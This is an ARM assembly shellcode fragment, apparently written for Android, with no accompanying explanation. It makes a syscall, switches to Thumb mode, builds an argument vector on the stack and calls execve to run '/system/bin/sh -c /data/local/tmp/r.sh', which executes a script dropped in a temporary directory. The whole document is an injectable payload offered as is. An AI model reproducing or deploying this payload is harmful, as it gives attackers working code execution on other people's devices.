.section .text
.global _start
_start:
    .code 32 
    mov    r12, r7
    mov    r7,  #0xC7
    svc    0
    mov    r7, r12
    cmp    r0, #0
    beq    payload
    cmn    r0, #0x1000
    bxls   lr

 payload:      
    push   {r0-r7, lr}

//-----------------------payload----------------------------------
    #Thumb-Mode on             //
	add r3, pc, #1    // This whole section is for "Thumb Mode"
    bx      r3            //
    .code 16              //

	//--------------arglist-------------------
    sub     sp, sp, #20
    mov     r0, pc

    add     r0, #34
    str     r0, [sp]

    add     r0, #15
    str     r0, [sp, #4]

    add     r0, #3
    str     r0, [sp, #8]

    sub     r0, r0, r0
    str     r0, [sp, #12]
    //-------------------argenv---------------
    str     r0, [sp, #16]

    ldr     r0, [sp]
    mov     r1, sp
    //sub     r2, r2, r2
    add     r2, sp, #16

    mov     r7, #11       // syscall execve in r7
    svc     0             // we execute
    add     sp, sp, #20
    bx      lr//for test
    pop     {r0-r7, pc}


.ascii "/system/bin/sh\x0"
.ascii "-c\x0"
.ascii "/data/local/tmp/r.sh\x0"
.ascii "\x0\x0"
